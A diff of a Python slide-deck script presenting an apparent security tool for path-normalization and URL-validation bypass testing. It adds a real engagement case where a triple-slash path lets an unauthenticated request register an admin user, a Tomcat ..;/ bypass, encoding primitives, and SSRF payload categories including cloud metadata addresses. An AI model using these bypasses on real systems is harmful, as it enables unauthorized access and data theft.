@@ -155,9 +155,9 @@ s_ref = prs.slides.add_slide(blank)
 paint_background(s_ref, BG)
 
 add_text(s_ref, Inches(0.75), Inches(0.55), Inches(11.8), Inches(0.7),
-         "Built on a decade of public research.", size=34, bold=True, color=FG, font=TITLE_FONT)
+         "The research this tool automates.", size=34, bold=True, color=FG, font=TITLE_FONT)
 add_text(s_ref, Inches(0.75), Inches(1.25), Inches(11.8), Inches(0.5),
-         "Path and URL parser bugs have been a drumbeat since 2018. Three talks/resources we lean on heavily:",
+         "Two talks from 2018 defined this bug class. Not much landmark research has landed since.",
          size=16, color=DIM, font=BODY_FONT)
 
 # Three reference cards stacked vertically
@@ -184,7 +184,7 @@ def reference_card(slide, top_in, venue, title, author_line, url):
              url, size=10, color=CODE_FG, font=MONO_FONT)
 
 reference_card(
-    s_ref, 2.05,
+    s_ref, 2.4,
     "BLACK HAT USA 2018 · DEF CON 26",
     "Breaking Parser Logic! Take Your Path Normalization Off and Pop 0days Out!",
     "Orange Tsai  ·  @orange_8361  ·  DEVCORE",
@@ -192,24 +192,19 @@ reference_card(
 )
 
 reference_card(
-    s_ref, 3.55,
+    s_ref, 4.1,
     "ZERONIGHTS 2018",
     "Reverse Proxies & Inconsistency",
     "Aleksei \"GreenDog\" Tiurin  ·  @antyurin  ·  Acunetix",
     "2018.zeronights.ru/wp-content/uploads/materials/20-Reverse-proxies-Inconsistency.pdf",
 )
 
-reference_card(
-    s_ref, 5.05,
-    "PORTSWIGGER RESEARCH  (ongoing)",
-    "URL Validation Bypass Cheat Sheet",
-    "PortSwigger  ·  open community PRs",
-    "portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet",
-)
-
 # Framing
-add_text(s_ref, Inches(0.75), Inches(6.7), Inches(11.8), Inches(0.4),
-         "Plus PoCs and CVE write-ups from Bentkowski, Kettle, Wallarm, and many more.",
+add_text(s_ref, Inches(0.75), Inches(6.2), Inches(11.8), Inches(0.4),
+         "Two parallel 2018 publications. Since then: CVEs (Spring, Tomcat, Jetty, Next.js) and bounty writeups.",
+         size=15, color=FG, font=BODY_FONT)
+add_text(s_ref, Inches(0.75), Inches(6.65), Inches(11.8), Inches(0.4),
+         "The tool folds in their taxonomy, the CVEs since, and folk techniques (overlong UTF-8, tab-splitter, sacrificial prefix).",
          size=13, color=DIM, font=BODY_FONT)
 
 add_footer_accent(s_ref)
@@ -238,8 +233,8 @@ add_text(s2, left0, top_labels, col_w, Inches(0.4),
 add_code_block(s2, left0, top_codes, col_w, Inches(1.8), [
     ("location /admin {",               CODE_FG),
     ("    deny all;",                    CODE_FG),
-    ("    return 403;",                  CODE_FG),
     ("}",                                 CODE_FG),
+    ("",                                  CODE_FG),
 ], size=14)
 
 # Column 2 — Spring Security
@@ -338,7 +333,7 @@ add_text(s4, Inches(0.75), Inches(1.25), Inches(11.8), Inches(0.5),
 # Bullet-style list as pseudo-code
 bullets = [
     ("~15 encoding tricks", "single, double, triple, overlong UTF-8, fullwidth Unicode"),
-    ("~8 path-shape primitives", "../  ..;/  ..%2f  /./  sacrificial-prefix  matrix-param  ..\\  //"),
+    ("~8 path-shape primitives", "../  ..;/  ..%2f  /./  /x/../  /users;foo=bar/profile  ..\\  //"),
     ("~5 whitespace/control insertions", "%09  %0a  %0d  %20  %00"),
     ("cross-combinations of the above", "../..%2f   ..;/%2e%2e%2f   %2e%09%2e   /x/../  /%u002e  ..."),
     ("target-preservation constraint", "every variant must still resolve to /admin after server-side normalization"),
@@ -369,6 +364,187 @@ add_text(s4, Inches(1.0), Inches(6.35), Inches(11.3), Inches(0.35),
          size=13, color=DIM, font=BODY_FONT)
 
 add_footer_accent(s4)
+
+
+# Slide 6 — real bug (the 403)
+s6 = prs.slides.add_slide(blank)
+paint_background(s6, BG)
+
+add_text(s6, Inches(0.75), Inches(0.55), Inches(11.8), Inches(0.7),
+         "Seen in the wild.", size=36, bold=True, color=FG, font=TITLE_FONT)
+add_text(s6, Inches(0.75), Inches(1.25), Inches(11.8), Inches(0.5),
+         "An engagement target's user-registration API. Unauth user hitting the admin endpoint. Expected 403.",
+         size=16, color=DIM, font=BODY_FONT)
+
+# Label
+add_text(s6, Inches(0.75), Inches(2.05), Inches(11.8), Inches(0.4),
+         "Request", size=13, bold=True, color=ACCENT, font=BODY_FONT)
+
+add_code_block(s6, Inches(0.75), Inches(2.45), Inches(11.8), Inches(2.85), [
+    ("POST /api/v1/users HTTP/2",                 CODE_FG),
+    ("Content-Type: application/json",            CODE_FG),
+    ("",                                           CODE_FG),
+    ("{",                                          CODE_FG),
+    ("  \"email\": \"jconesa@...net-spi.com\",",   CODE_FG),
+    ("  \"userName\": \"jconesa\",",               CODE_FG),
+    ("  \"roleId\": \"60183e185dacfc6814829ac7\",", CODE_FG),
+    ("  \"groups\": [], \"preferences\": { \"localeId\": \"en-US\" }", CODE_FG),
+    ("}",                                          CODE_FG),
+], size=14)
+
+# Label
+add_text(s6, Inches(0.75), Inches(5.5), Inches(11.8), Inches(0.4),
+         "Response", size=13, bold=True, color=ACCENT, font=BODY_FONT)
+
+add_code_block(s6, Inches(0.75), Inches(5.9), Inches(11.8), Inches(1.0), [
+    ("HTTP/2 403 Forbidden",                                                  BAD),
+    ("",                                                                       CODE_FG),
+    ("{\"error\":{\"code\":101,\"message\":\"Access denied\",\"status\":403}}", CODE_FG),
+], size=14)
+
+add_footer_accent(s6)
+
+
+# Slide 7 — the bypass
+s7 = prs.slides.add_slide(blank)
+paint_background(s7, BG)
+
+add_text(s7, Inches(0.75), Inches(0.55), Inches(11.8), Inches(0.7),
+         "Three slashes later.", size=36, bold=True, color=FG, font=TITLE_FONT)
+add_text(s7, Inches(0.75), Inches(1.25), Inches(11.8), Inches(0.5),
+         "Same body. Same headers. One path mutation.",
+         size=16, color=DIM, font=BODY_FONT)
+
+# Label
+add_text(s7, Inches(0.75), Inches(2.05), Inches(11.8), Inches(0.4),
+         "Request", size=13, bold=True, color=ACCENT, font=BODY_FONT)
+
+add_code_block(s7, Inches(0.75), Inches(2.45), Inches(11.8), Inches(2.85), [
+    ("POST /api///v1/users HTTP/2      ← note the /// between api and v1",  GOOD),
+    ("Content-Type: application/json",            CODE_FG),
+    ("",                                           CODE_FG),
+    ("{",                                          CODE_FG),
+    ("  \"email\": \"jconesa@...net-spi.com\",",   CODE_FG),
+    ("  \"userName\": \"jconesa\",",               CODE_FG),
+    ("  \"roleId\": \"<admin-role-id>\",",         CODE_FG),
+    ("  ...",                                      CODE_FG),
+    ("}",                                          CODE_FG),
+], size=14)
+
+# Label
+add_text(s7, Inches(0.75), Inches(5.5), Inches(11.8), Inches(0.4),
+         "Response", size=13, bold=True, color=ACCENT, font=BODY_FONT)
+
+add_code_block(s7, Inches(0.75), Inches(5.9), Inches(11.8), Inches(1.0), [
+    ("HTTP/2 201 Created                    ← admin user registered",  GOOD),
+    ("",                                                                 CODE_FG),
+    ("{\"id\":\"6...\", \"userName\":\"jconesa\", \"roleId\":\"admin\"}", CODE_FG),
+], size=14)
+
+add_footer_accent(s7)
+
+
+# Slide 8 — second real bug: Tomcat default page exposed via ..;/
+s8 = prs.slides.add_slide(blank)
+paint_background(s8, BG)
+
+add_text(s8, Inches(0.75), Inches(0.55), Inches(11.8), Inches(0.7),
+         "Another one, found manually.", size=34, bold=True, color=FG, font=TITLE_FONT)
+
+# Embed the actual screenshot
+tomcat_img = Path(__file__).resolve().parent.parent / "docs" / "tomcat-bypass.png"
+if tomcat_img.is_file():
+    s8.shapes.add_picture(str(tomcat_img), Inches(0.75), Inches(1.3), Inches(11.8), Inches(2.2))
+
+# The vulnerable config — what the backend rule looks like
+add_text(s8, Inches(0.75), Inches(3.75), Inches(5.9), Inches(0.4),
+         "The proxy config (Nginx)", size=13, bold=True, color=ACCENT, font=BODY_FONT)
+add_code_block(s8, Inches(0.75), Inches(4.15), Inches(5.9), Inches(1.5), [
+    ("location /script/ {",                  CODE_FG),
+    ("    proxy_pass http://tomcat:8080;",   CODE_FG),
+    ("}",                                     CODE_FG),
+    ("",                                      CODE_FG),
+    ("# Nginx treats ..;  as a literal name", DIM),
+], size=14)
+
+add_text(s8, Inches(6.9), Inches(3.75), Inches(5.9), Inches(0.4),
+         "What Tomcat actually does", size=13, bold=True, color=ACCENT, font=BODY_FONT)
+add_code_block(s8, Inches(6.9), Inches(4.15), Inches(5.9), Inches(1.5), [
+    ("GET /script/..;/",                      CODE_FG),
+    ("   strip ;   →  /script/../",           CODE_FG),
+    ("   normalize →  /",                      GOOD),
+    ("",                                       CODE_FG),
+    ("# ROOT context served, unauth",         GOOD),
+], size=14)
+
+# One-liner takeaway
+add_text(s8, Inches(0.75), Inches(5.85), Inches(11.8), Inches(0.5),
+         "Proxy and origin disagree on what ..;/ means. Orange Tsai's canonical technique — Uber, Amazon, Bynder all fell to this.",
+         size=14, bold=True, color=DIM, font=BODY_FONT)
+
+add_footer_accent(s8)
+
+
+# Slide 9 — URL Validation tab
+s9 = prs.slides.add_slide(blank)
+paint_background(s9, BG)
+
+add_text(s9, Inches(0.75), Inches(0.55), Inches(11.8), Inches(0.7),
+         "URL Validation tab.", size=36, bold=True, color=FG, font=TITLE_FONT)
+add_text(s9, Inches(0.75), Inches(1.25), Inches(11.8), Inches(0.5),
+         "Different bypass, same tool. Tests SSRF, open-redirect, and CORS allowlist bypasses.",
+         size=16, color=DIM, font=BODY_FONT)
+
+# Reference card — reuse the helper
+reference_card(
+    s9, 2.1,
+    "PORTSWIGGER RESEARCH  ·  OPEN SOURCE DATA",
+    "URL Validation Bypass Cheat Sheet",
+    "portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet",
+    "github.com/PortSwigger/url-cheatsheet-data  ·  6 categories  ·  open to community PRs",
+)
+
+# What the tool gets from upstream
+add_text(s9, Inches(0.75), Inches(3.7), Inches(11.8), Inches(0.4),
+         "Payloads synced directly from the PortSwigger GitHub repo. Emitted across 3 contexts × 5 encodings.",
+         size=15, bold=True, color=ACCENT, font=BODY_FONT)
+
+col_w = Inches(3.75)
+col_gap = Inches(0.2)
+left0 = Inches(0.75)
+top_cards = Inches(4.2)
+card_h = Inches(2.0)
+
+categories = [
+    ("Domain allowlist bypass", "94 payloads", "Subdomain tricks, userinfo\nconfusion, @-splitting,\nport-based bypasses"),
+    ("Fake relative URLs", "73 payloads", "Tab/newline inside host,\nscheme-relative //, backslash\nas slash, protocol-relative"),
+    ("Loopback", "68 payloads", "127.0.0.1 in 20+ forms:\nhex, octal, decimal, IPv6,\n[::ffff:7f00:1], 0x7f000001"),
+]
+
+for i, (title, count, desc) in enumerate(categories):
+    left = left0 + i * (col_w + col_gap)
+    add_code_block(s9, left, top_cards, col_w, card_h, [
+        (title, ACCENT),
+        (count, GOOD),
+        ("", CODE_FG),
+        *[(line, DIM) for line in desc.split("\n")],
+    ], size=12)
+
+# Bottom row — smaller categories + sync note
+bottom_items = [
+    "IPv6 (3) — zone-ID attacks",
+    "Cloud metadata (17) — 169.254.169.254 in IPv6/hex/decimal",
+    "URL-splitting Unicode (51) — chars that break parsers",
+]
+add_text(s9, Inches(0.75), Inches(6.35), Inches(11.8), Inches(0.35),
+         "   +   ".join(bottom_items),
+         size=11, color=DIM, font=BODY_FONT)
+
+add_text(s9, Inches(0.75), Inches(6.75), Inches(11.8), Inches(0.35),
+         "We keep in sync with upstream via scripts/sync-url-cheatsheet.py. New community PRs land automatically.",
+         size=11, color=DIM, font=BODY_FONT)
+
+add_footer_accent(s9)
 
 
 # ---------------------------------------------------------------------------
